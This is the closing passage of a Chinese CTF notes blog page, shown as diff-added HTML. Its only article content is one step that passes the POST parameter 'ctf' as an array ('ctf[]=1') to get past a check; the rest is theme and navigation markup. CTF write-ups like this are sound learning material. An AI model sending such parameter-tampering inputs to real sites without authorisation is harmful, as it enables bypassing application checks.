+<h4 id="所以，我们可以通过此思路，让以post参数ctf中获取的输入为一个数组即可"><a href="#所以，我们可以通过此思路，让以post参数ctf中获取的输入为一个数组即可" class="headerlink" title="所以，我们可以通过此思路，让以post参数ctf中获取的输入为一个数组即可"></a>所以，我们可以通过此思路，让以post参数ctf中获取的输入为一个数组即可</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ctf[]<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/ctfwp/ctf/9025f551397ac77f8e51aef1db4cf26f.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Ctf做题笔记</div>
+      <div>https://chiya-66.github.io/2026/08/04/Ctf做题笔记/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chiya-66</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年8月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/08/08/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/" title="解析漏洞与编辑器漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">解析漏洞与编辑器漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/08/01/xxe/" title="XXE 漏洞详解">
+                        <span class="hidden-mobile">XXE 漏洞详解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
